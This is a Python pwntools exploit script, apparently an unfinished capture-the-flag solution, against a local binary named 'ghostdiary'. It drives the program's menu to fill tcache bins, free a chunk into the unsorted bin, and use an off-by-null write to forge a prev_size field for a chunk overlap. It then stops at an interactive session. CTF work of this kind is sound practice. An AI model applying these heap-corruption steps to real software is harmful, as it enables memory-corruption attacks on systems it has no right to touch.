from pwn import *
elf = ELF('./ghostdiary', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)

def new_page(size):
    # page 1 < 0xf1   = 241
    # page 2 > 0x10f && < 0x1e1 = 271
    p.sendlineafter(b'>', b'1')
    if size < 0xf1:
        p.sendlineafter(b'>', b'1')
    elif size > 0xf1 and size <= 0x10f:
        p.sendlineafter(b'>', b'2')
        size = size + (0x10f-size) + 1
    else:
        p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', b'%d' % size)

def write_page(idx, data):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', b'%d' % idx)
    p.sendlineafter(b':', b'%s' % data)

def view_page(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', b'%d' % idx)
    return p.recvline().strip()[9:]

def del_page(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b':', b'%d' % idx)

p = elf.process()

new_page(0x128) # 0
new_page(0x118)  # 1
new_page(0x118)  # 2

for i in range(7):
    new_page(0x118)
for i in range(7):
    del_page(i+3)

for i in range(7):
    new_page(0x128)
for i in range(7):
    del_page(i+3)

del_page(0)     # 0 goes unsorted bin
new_page(0x118)  # 0

del_page(1)     # 1
new_page(0x118)  # 1
write_page(1,  b'b'*0x118)

# set prev #2 0x210
for i in range(0x118, 0x110, -1):
    write_page(1,  b'b'*(i-1) + b'\x00')

write_page(1,  b'b'*0x110 + b'\x10\x02')



p.interactive()